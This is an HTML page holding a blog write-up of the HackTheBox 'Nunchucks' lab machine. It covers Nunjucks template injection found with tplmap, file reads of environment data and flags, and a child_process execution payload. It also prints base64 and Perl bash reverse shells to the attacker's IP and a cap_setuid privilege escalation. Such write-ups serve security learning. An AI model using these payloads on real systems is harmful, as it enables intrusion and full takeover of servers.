<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - Nunchucks | Ef's log</title><meta name=keywords content="HackTheBox,CTF,Computer Security,Cyber Security,Pentesting"><meta name=description content="SSTI in Nunjucks and SUID capability on Perl"><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/hackthebox/nunchucks/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Nunchucks"><meta property="og:description" content="SSTI in Nunjucks and SUID capability on Perl"><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/nunchucks/"><meta property="og:image" content="https://fahmifj.github.io/hackthebox/nunchucks/imgs/image-20211124153515406.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2021-11-07T01:42:05+07:00"><meta property="article:modified_time" content="2021-11-07T01:42:05+07:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/hackthebox/nunchucks/imgs/image-20211124153515406.png"><meta name=twitter:title content="HackTheBox - Nunchucks"><meta name=twitter:description content="SSTI in Nunjucks and SUID capability on Perl"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - Nunchucks","item":"https://fahmifj.github.io/hackthebox/nunchucks/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Nunchucks","name":"HackTheBox - Nunchucks","description":"SSTI in Nunjucks and SUID capability on Perl","keywords":["HackTheBox","CTF","Computer Security","Cyber Security","Pentesting"],"articleBody":"Nunchucks features a NodeJS website that uses Nunjucks as its templating engine. Fuzzing for the hostname reveals another website that is vulnerable to SSTI, which can be exploited to gain initial access to the system. Further enumeration reveals that the Perl binary has the cap_setuid capability set, and this eventually allows me to escalate myself to root.\nI really enjoyed the foothold part of this box, so that section might be a bit longer.\nSkills Learned Web enumeration SSTI on Nunjucks Creating tplmap middleware using Flask Exploiting cap_setuid on Perl Tools Nmap Tplmap Flask Reconnaissance Nmap Full TCP scan with nmap reveals 3 open ports: SSH on its default, HTTP and its secure version, HTTPS.\nâ†’ kali@kali Â«nunchucksÂ» Â«10.10.14.46Â» $ fscan 10.10.11.122 nunchucks nmap -p- 10.10.11.122 | grep '^[0-9]' | cut -d '/' -f1 | tr '\\n' ',' | sed 's/,$//' nmap -p 22,80,443 -sC -sV -oA nmap/all-tcp-ports-nunchucks 10.10.11.122 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-05 07:12 EDT Nmap scan report for 10.10.11.122 Host is up (0.14s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA) | 256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA) |_ 256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to https://nunchucks.htb/ 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Nunchucks - Landing Page | ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK | Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb | Not valid before: 2021-08-30T15:42:24 |_Not valid after: 2031-08-28T15:42:24 | tls-alpn: |_ http/1.1 | tls-nextprotoneg: |_ http/1.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.77 seconds Iâ€™ll update my /etc/hosts.\nâ†’ kali@kali Â«nunchucksÂ» Â«10.10.14.46Â» $ echo '10.10.11.122 nunchucks.htb' | sudo tee -a /etc/hosts Enumeration HTTP -\u003e HTTPS For HTTP, nothing interesting in the server response, it has permanent redirection to HTTPS.\nâ†’ kali@kali Â«nunchucksÂ» Â«10.10.14.46Â» $ curl -I http://nunchucks.htb/ HTTP/1.1 301 Moved Permanently Server: nginx/1.18.0 (Ubuntu) Date: Fri, 05 Nov 2021 11:51:32 GMT Content-Type: text/html Content-Length: 178 Connection: keep-alive Location: https://nunchucks.htb/ nunchucks.htb On the HTTPS, itâ€™s a company site called Nunchucks that offers online shop creation.\nAt the bottom of the page, there is an email, also it says it will have a store soon.\nOpening Wappalyzer reveals itâ€™s using Node.js and PHP. I doubt itâ€™s PHP since appending .php gives me a 404 error.\nThe signup button sends me to /signup where a signup form is shown. I will just signup and intercept the request.\nIâ€™ll send this request to repeater just in case, and then forward it\nBut then, the returned response states that registration is closed\nI changed the endpoint to /api/login, and it returns the same.\nSending a malformed input breaks the parser and leaks the web directory.\nNothing else to try here.\nSubdomain Fuzz Fuzzing the Host header reveals a subdomain: store.nunchucks.htb\nâ†’ kali@kali Â«nunchucksÂ» Â«10.10.14.46Â» $ ffuf -k -u https://nunchucks.htb -H \"Host: FUZZ.nunchucks.htb\" -mc 200 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fl 547 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.0-dev ________________________________________________ :: Method : GET :: URL : https://nunchucks.htb :: Wordlist : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt :: Header : Host: FUZZ.nunchucks.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200 :: Filter : Response lines: 547 ________________________________________________ store [Status: 200, Size: 4028, Words: 1053, Lines: 102] :: Progress: [4989/4989] :: Job [1/1] :: 269 req/sec :: Duration: [0:00:22] :: Errors: 0 :: Iâ€™ll update my /etc/hosts again.\nâ†’ kali@kali Â«nunchucksÂ» Â«10.10.14.46Â» $ echo '10.10.11.122 store.nunchucks.htb' | sudo tee -a /etc/hosts store.nunchucks.htb Store is not available, but I can subscribe for newsletter.\nWhen I submit an email address there, it reflects the address back.\nFoothold SSTI Identify Since Iâ€™ve got a spoiler from the machine tags and the machine name, I immediately sent the typical {{7*7}} SSTI payload, and 49 returned in the email address. This means the site is vulnerable.\nThe email validation is on client-side.\nCreating Middleware for tplmap with Flask The machine name gives a big spoiler about which templating engine this machine uses (Nunjucks), and there is a nice writeup that shows how to exploit it here. But, Iâ€™d like to let tplmap identify it for me.\nUnfortunately, there is no such option in tplmap for sending a request in JSON format. Therefore, I created a simple middleware using Flask which acts as a middleman/proxy that will takes the non-JSON request and convert it before forwarding the request to store.nunchucks.htb. Hereâ€™s the code:\nIf youâ€™re having trouble with tplmap, maybe this post here could resolve it.\nIâ€™ll run the middleware.\nâ†’ kali@kali Â«exploitsÂ» Â«10.10.14.46Â» $ python3 middleware.py * Serving Flask app \"middleware\" (lazy loading) * Environment: production WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Debug mode: off * Running on http://0.0.0.0:80/ (Press CTRL+C to quit) Then I will point tplmap to the middleware.\n(tplmap-venv) â†’ kali@kali Â«tplmapÂ» Â«10.10.14.46Â» $ ./tplmap.py -u 'http://127.0.0.1/?email=0mochi@iamf.htb' Now Iâ€™ll just wait for it to finish, and hereâ€™s the image of how it went.\nAfter a few sec later, tplmap finally got it right.\n(tplmap-venv) â†’ kali@kali Â«tplmapÂ» Â«10.10.14.46Â» git:(master) $ ./tplmap.py -u 'http://127.0.0.1/?email=0mochi@iamf.htb' [+] Tplmap 0.5 Automatic Server-Side Template Injection Detection and Exploitation Tool [+] Testing if GET parameter 'email' is injectable ...[SNIP]... [+] Nunjucks plugin is testing rendering with tag '{{*}}' [+] Nunjucks plugin has confirmed injection with tag '{{*}}' [+] Tplmap identified the following injection point: GET parameter: email Engine: Nunjucks Injection: {{*}} Context: text OS: linux Technique: render Capabilities: Shell command execution: no Bind and reverse shell: no File write: ok File read: ok Code evaluation: ok, javascript code [+] Rerun tplmap providing one of the following options: --upload LOCAL REMOTE Upload files to the server --download REMOTE LOCAL Download remote files Based on the tplmap results, it seems that command execution is not possible.\nGrabbing The Flag With the file read ability, the first file I want to grab isnâ€™t /etc/passwd, but /proc/self/environ, which most likely to reveal some sensitive information.\n(tplmap-venv) â†’ kali@kali Â«tplmapÂ» Â«10.10.14.46Â» git:(master) $ ./tplmap.py -u 'http://127.0.0.1/?email=0mochi@iamf.htb' --engine Nunjucks --download '/proc/self/environ' 'loot/dl_environ' [+] Tplmap 0.5 Automatic Server-Side Template Injection Detection and Exploitation Tool [+] Testing if GET parameter 'email' is injectable [+] Nunjucks plugin is testing rendering with tag '{{*}}' [+] Nunjucks plugin has confirmed injection with tag '{{*}}' [+] Tplmap identified the following injection point: GET parameter: email Engine: Nunjucks Injection: {{*}} Context: text OS: linux Technique: render Capabilities: Shell command execution: no Bind and reverse shell: no File write: ok File read: ok Code evaluation: ok, javascript code [*][plugin] Remote file md5 mismatch, check manually Even though the tool showed md5 mismatch, I can still read the file contents. This file reveals that the app is running as user david under /var/www/store.nunchucks.\nâ†’ kali@kali Â«tplmapÂ» Â«10.10.14.46Â» git:(master) âœ— $ cat loot/dl_environ | tr ',' '\\n' LANG=en_GB.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/usr/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/binPIDFILE=/home/david/.pm2/pm2.pidHOME=/home/davidLOGNAME=davidUSER=davidSHELL=/bin/bashINVOCATION_ID=c56bdde5ecfc4ab2800ce66c625918d4JOURNAL_STREAM=9:34693PM2_USAGE=CLIPM2_HOME=/home/david/.pm2SILENT=truewindowsHide=truepm2_env={\"kill_retry_time\":100 \"windowsHide\":true \"username\":\"david\" \"treekill\":true \"automation\":true \"pmx\":true \"instance_var\":\"NODE_APP_INSTANCE\" \"watch\":false \"autorestart\":true \"vizion\":true \"env\":{\"PM2_USAGE\":\"CLI\" \"OLDPWD\":\"/var/www\" \"_\":\"/usr/local/bin/pm2\" \"MAIL\":\"/var/mail/david\" \"DBUS_SESSION_BUS_ADDRESS\":\"unix:path=/run/user/1000/bus\" \"PATH\":\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\" \"HUSHLOGIN\":\"FALSE\" \"JOURNAL_STREAM\":\"9:35778\" \"XDG_RUNTIME_DIR\":\"/run/user/1000\" \"XDG_SESSION_ID\":\"1\" \"XDG_VTNR\":\"1\" \"SHLVL\":\"1\" \"USER\":\"david\" \"LESSOPEN\":\"| /usr/bin/lesspipe %s\" \"TERM\":\"linux\" \"XDG_SESSION_CLASS\":\"user\" \"LESSCLOSE\":\"/usr/bin/lesspipe %s %s\" \"INVOCATION_ID\":\"d8a8bc4baeb140c685790fc6e1974718\" \"LS_COLORS\":\"rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:\" \"LANG\":\"en_GB.UTF-8\" \"HOME\":\"/home/david\" \"MOTD_SHOWN\":\"pam\" \"XDG_SESSION_TYPE\":\"tty\" \"LOGNAME\":\"david\" \"PWD\":\"/var/www/store.nunchucks\" \"XDG_SEAT\":\"seat0\" \"SHELL\":\"/bin/bash\" \"PM2_HOME\":\"/home/david/.pm2\" \"server\":{} \"unique_id\":\"cc712ea0-c7b6-40af-9a85-94d9a4fee31a\"} \"namespace\":\"default\" \"filter_env\":[] \"name\":\"server\" \"node_args\":[] \"pm_exec_path\":\"/var/www/store.nunchucks/server.js\" \"pm_cwd\":\"/var/www/store.nunchucks\" \"exec_interpreter\":\"node\" \"exec_mode\":\"cluster_mode\" \"pm_out_log_path\":\"/home/david/.pm2/logs/server-out-6.log\" \"pm_err_log_path\":\"/home/david/.pm2/logs/server-error-6.log\" \"pm_pid_path\":\"/home/david/.pm2/pids/server-6.pid\" \"km_link\":false \"vizion_running\":false \"NODE_APP_INSTANCE\":5 \"PM2_USAGE\":\"CLI\" \"OLDPWD\":\"/var/www\" \"_\":\"/usr/local/bin/pm2\" \"MAIL\":\"/var/mail/david\" \"DBUS_SESSION_BUS_ADDRESS\":\"unix:path=/run/user/1000/bus\" \"PATH\":\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\" \"HUSHLOGIN\":\"FALSE\" \"JOURNAL_STREAM\":\"9:35778\" \"XDG_RUNTIME_DIR\":\"/run/user/1000\" \"XDG_SESSION_ID\":\"1\" \"XDG_VTNR\":\"1\" \"SHLVL\":\"1\" \"USER\":\"david\" \"LESSOPEN\":\"| /usr/bin/lesspipe %s\" \"TERM\":\"linux\" \"XDG_SESSION_CLASS\":\"user\" \"LESSCLOSE\":\"/usr/bin/lesspipe %s %s\" \"INVOCATION_ID\":\"d8a8bc4baeb140c685790fc6e1974718\" \"LS_COLORS\":\"rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:\" \"LANG\":\"en_GB.UTF-8\" \"HOME\":\"/home/david\" \"MOTD_SHOWN\":\"pam\" \"XDG_SESSION_TYPE\":\"tty\" \"LOGNAME\":\"david\" \"PWD\":\"/var/www/store.nunchucks\" \"XDG_SEAT\":\"seat0\" \"SHELL\":\"/bin/bash\" \"PM2_HOME\":\"/home/david/.pm2\" \"unique_id\":\"cc712ea0-c7b6-40af-9a85-94d9a4fee31a\" \"status\":\"launching\" \"pm_uptime\":1636123032873 \"axm_actions\":[] \"axm_monitor\":{} \"axm_options\":{} \"axm_dynamic\":{} \"created_at\":1633378615869 \"restart_time\":2 \"unstable_restarts\":0 \"_pm2_version\":\"5.1.1\" \"version\":\"1.0.0\" \"versioning\":null \"node_version\":\"10.19.0\" \"pm_id\":6 \"exit_code\":0}NODE_UNIQUE_ID=12NODE_CHANNEL_FD=3 Since I know the username, I can try to grab the flag now.\nâ†’ kali@kali Â«tplmapÂ» Â«10.10.14.46Â» git:(master) âœ— $ ./tplmap.py -u 'http://127.0.0.1/?email=0mochi@iamf.htb' --engine Nunjucks --download '/home/david/user.txt' 'loot/user.txt' â†’ kali@kali Â«tplmapÂ» Â«10.10.14.46Â» git:(master) âœ— $ cat loot/user.txt bac81...[SNIP]... Shell as david tpl-shell With write access, I tried to drop my public key to /home/david/.ssh/authorized_keys, but didnâ€™t work. One possible thing is that there is no .ssh folder, and to create one I need command execution!\nAfter some hours, I tried the --tpl-shell, and using the same blog for syntax reference.\nâ†’ kali@kali Â«tplmapÂ» Â«10.10.14.46Â» git:(master) âœ— $ tplmap -u 'http://127.0.0.1/?email=0mochi@iamf.htb' --engine Nunjucks --tpl-shell [+] Tplmap 0.5 Automatic Server-Side Template Injection Detection and Exploitation Tool [+] Testing if GET parameter 'email' is injectable [+] Nunjucks plugin is testing rendering with tag '{{*}}' [+] Nunjucks plugin has confirmed injection with tag '{{*}}' [+] Tplmap identified the following injection point: GET parameter: email Engine: Nunjucks Injection: {{*}} Context: text OS: linux Technique: render Capabilities: Shell command execution: no Bind and reverse shell: no File write: ok File read: ok Code evaluation: ok, javascript code [+] Inject multi-line template code. Press ctrl-D to send the lines [0] nunjucks \u003e Previously tplmap identified that I didnâ€™t have code/OS command execution, but hereâ€™s what I got when trying to create .ssh folder:\n[0] nunjucks \u003e range.constructor(\"return global.process.mainModule.require('child_process').execSync('ls -la ~/.ssh')\")() [1] nunjucks \u003e [0] nunjucks \u003e range.constructor(\"return global.process.mainModule.require('child_process').execSync('mkdir ~/.ssh')\")() [1] nunjucks \u003e [0] nunjucks \u003e range.constructor(\"return global.process.mainModule.require('child_process').execSync('ls -l ~/.ssh')\")() [1] nunjucks \u003e total 0\\n I definitely can execute OS command ðŸ˜®!\nReverse shell I tried to inject my SSH pubkey and login, but a password prompt pops out. Therefore, I will use a base64 encoded reverse shell.\nThe payload:\nâ†’ kali@kali Â«nunchucksÂ» Â«10.10.14.46Â» $ echo 'bash -c \"bash -i \u003e\u0026 /dev/tcp/10.10.14.46/53 0\u003e\u00261\"' | base64 YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ni81MyAwPiYxIgo= Now Iâ€™ll put that payload to davidâ€™s home, and execute it.\n[0] nunjucks \u003e range.constructor(\"return global.process.mainModule.require('child_process').execSync('echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ni81MyAwPiYxIgo= | base64 -d \u003e ~/.0mochi.sh \u0026\u0026 chmod +x ~/.0mochi.sh')\")() [1] nunjucks \u003e [0] nunjucks \u003e range.constructor(\"return global.process.mainModule.require('child_process').execSync('ls -l ~/.0mochi.sh')\")() [1] nunjucks \u003e -rwxr-xr-x 1 david david 50 Nov 5 15:32 /home/david/.0mochi.sh\\n [0] nunjucks \u003e range.constructor(\"return global.process.mainModule.require('child_process').execSync('bash ~/.0mochi.sh')\")() [1] nunjucks \u003e On my listener.\nâ†’ kali@kali Â«nunchucksÂ» Â«10.10.14.46Â» $ nc -nvlp 53 listening on [any] 53 ... connect to [10.10.14.46] from (UNKNOWN) [10.10.11.122] 39352 bash: cannot set terminal process group (1009): Inappropriate ioctl for device bash: no job control in this shell david@nunchucks:/var/www/store.nunchucks$ id id uid=1000(david) gid=1000(david) groups=1000(david) david@nunchucks:/var/www/store.nunchucks$ Privilege Escalation Shell as root Enumeration Under /opt there is a backup script written in Perl.\ndavid@nunchucks:/opt$ ls -la total 16 drwxr-xr-x 3 root root 4096 Oct 28 17:03 . drwxr-xr-x 19 root root 4096 Oct 28 17:03 .. -rwxr-xr-x 1 root root 838 Sep 1 12:53 backup.pl drwxr-xr-x 2 root root 4096 Oct 28 17:03 web_backups david@nunchucks:/opt$ ls web_backups/ -l total 14944 -rw-rw-r-- 1 root david 7651273 Sep 26 01:06 backup_2021-09-26-1632618416.tar -rw-rw-r-- 1 root david 7651273 Sep 26 01:18 backup_2021-09-26-1632619104.tar The script code:\n#!/usr/bin/perl use strict; use POSIX qw(strftime); use DBI; use POSIX qw(setuid); POSIX::setuid(0); my $tmpdir = \"/tmp\"; my $backup_main = '/var/www'; my $now = strftime(\"%Y-%m-%d-%s\", localtime); my $tmpbdir = \"$tmpdir/backup_$now\"; sub printlog { print \"[\", strftime(\"%D %T\", localtime), \"] $_[0]\\n\"; } sub archive { printlog \"Archiving...\"; system(\"/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2\u003e/dev/null\"); printlog \"Backup complete in $tmpbdir/backup_$now.tar\"; } if ($\u003e != 0) { die \"You must run this script as root.\\n\"; } printlog \"Backup starts.\"; mkdir($tmpbdir); \u0026archive; printlog \"Moving $tmpbdir/backup_$now to /opt/web_backups\"; system(\"/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/\"); printlog \"Removing temporary directory\"; rmdir($tmpbdir); printlog \"Completed\"; When I run it, I find that I passed the first if statement, which checks for root priv.\ndavid@nunchucks:/opt$ ./backup.pl [11/05/21 15:56:43] Backup starts. [11/05/21 15:56:43] Archiving... [11/05/21 15:56:44] Backup complete in /tmp/backup_2021-11-05-1636127803/backup_2021-11-05-1636127803.tar [11/05/21 15:56:44] Moving /tmp/backup_2021-11-05-1636127803/backup_2021-11-05-1636127803 to /opt/web_backups [11/05/21 15:56:44] Removing temporary directory [11/05/21 15:56:44] Completed david@nunchucks:/opt$ A quick check on Perl capabilities reveals that it has cap_setuid+ep.\ndavid@nunchucks:/tmp$ getcap $(which perl) /usr/bin/perl = cap_setuid+ep Exploit cap_setuid+ep I tried the GTFObins way to exploit the cap_setuid capability, but it didnâ€™t spawn me a root shell. However, executing whoami still shows that Iâ€™m root.\ndavid@nunchucks:/tmp$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";' david@nunchucks:/tmp$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"whoami\";' root I also couldnâ€™t get the root flag, it returned with permission denied.\nThe next thing I tried was reusing the backup script, but with all of the code except the header stripped off and I changed the system command for executing reverse shell.\ndavid@nunchucks:/tmp$ cat .0mochi.pl #!/usr/bin/perl use strict; use POSIX qw(strftime); use DBI; use POSIX qw(setuid); POSIX::setuid(0); system(\"/bin/bash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.14.46/53 0\u003e\u00261'\") david@nunchucks:/tmp$ chmod +x .0mochi.pl And it worked!\nâ†’ kali@kali Â«nunchucksÂ» Â«10.10.14.46Â» $ nc -nvlp 53 listening on [any] 53 ... connect to [10.10.14.46] from (UNKNOWN) [10.10.11.122] 39386 root@nunchucks:/tmp# id id uid=0(root) gid=1000(david) groups=1000(david) The flag\nroot@nunchucks:/tmp# cat /root/root.txt cat /root/root.txt 1d2cc...[SNIP]... ","wordCount":"2100","inLanguage":"en","image":"https://fahmifj.github.io/hackthebox/nunchucks/imgs/image-20211124153515406.png","datePublished":"2021-11-07T01:42:05+07:00","dateModified":"2021-11-07T01:42:05+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/nunchucks/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button 